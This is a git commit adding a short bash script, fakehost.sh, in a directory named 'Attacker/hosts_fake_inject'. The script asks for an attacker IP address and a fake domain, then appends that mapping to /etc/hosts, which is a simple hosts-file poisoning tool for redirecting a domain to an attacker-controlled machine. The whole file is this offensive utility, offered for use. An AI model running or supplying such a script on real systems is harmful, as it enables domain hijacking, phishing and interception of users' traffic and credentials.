12efde2b161e0f36281e6ab885388a98e6106ac3
nu11secur1ty <venvaropt@gmail.com>
2019-11-22 10:33:41 +0200

    Create fakehost.sh

---
+++ Attacker/hosts_fake_inject/fakehost.sh
@@ -0,0 +1,10 @@
+#!/usr/bin/bash
+# Author @nu11secur1ty-2019
+# v-1.0
+
+echo "type the attacket IP"
+	read IP
+echo "type the fake domain"
+	read domain
+echo -e "$IP   $domain" >> /etc/hosts
+exit 0;
